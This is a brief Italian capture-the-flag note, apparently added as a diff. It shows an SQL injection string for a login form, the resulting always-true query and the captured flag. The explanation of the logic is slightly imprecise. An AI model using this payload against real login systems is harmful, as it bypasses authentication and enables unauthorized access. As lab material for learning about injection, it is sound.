@@ -1,0 +1,3 @@
+usare il comando "foo' or '1=1 -- -" dove la query sarà "SELECT * FROM login WHERE password = 'foo' or '1=1 -- -'", controlla se la password è "foo" o "1=1", dove sarà sempre True.
+
+Flag = flag{1s_ths_h0w_l0g1ns_w0rk}
